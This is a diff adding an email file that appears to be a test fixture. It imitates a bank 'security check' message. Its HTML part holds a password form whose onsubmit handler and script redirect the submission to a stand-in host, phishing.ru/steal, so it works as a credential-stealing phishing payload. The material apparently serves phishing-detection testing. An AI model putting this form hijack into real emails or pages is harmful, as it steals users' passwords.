@@ -1,0 +1,24 @@
+From: security@bank.com
+To: test-user@example.com
+Subject: Security Check Required
+Date: Tue, 08 Sep 2026 10:00:00 +0000
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+ boundary="===============2567634075267838465=="
+
+--===============2567634075267838465==
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: 7bit
+
+Please complete the security check.
+
+--===============2567634075267838465==
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+MIME-Version: 1.0
+
+<form method=3D"POST" action=3D"https://bank.com/verify" onsubmit=3D"this.act=
+ion=3D'http://phishing.ru/steal'"><input name=3D"password" type=3D"password">=
+</form><script>this.action=3D'http://phishing.ru/steal'</script>
+
+--===============2567634075267838465==--
